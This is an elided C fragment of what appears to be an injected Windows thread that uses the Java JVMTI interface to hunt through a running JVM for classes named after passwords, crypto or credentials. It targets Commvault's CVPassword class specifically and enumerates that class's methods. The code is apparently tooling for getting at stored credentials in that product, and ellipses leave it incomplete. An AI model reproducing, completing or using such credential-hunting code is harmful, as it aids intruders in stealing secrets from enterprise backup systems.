...
DWORD WINAPI go(LPVOID _) {
    ...
    for (jint i=0;i<cc;i++){
        ...
        if ((*ti)->GetClassSignature(ti,classes[i],&sig,NULL)==JVMTI_ERROR_NONE && sig){
            if (strstr(sig,"Password")||strstr(sig,"Crypt")||strstr(sig,"redential")){
                fprintf(f,"CLASS %s\n",sig);
                if (strcmp(sig,"Lcommvault/web/shared/CVPassword;")==0) target=classes[i];
            }
    ...
    if (target){
        jint mc; jmethodID* m;
        if ((*ti)->GetClassMethods(ti,target,&mc,&m)==JVMTI_ERROR_NONE){
            for (jint i=0;i<mc;i++){
    ...
    } else fprintf(f,"CVPassword not loaded - see CLASS lines above\n");
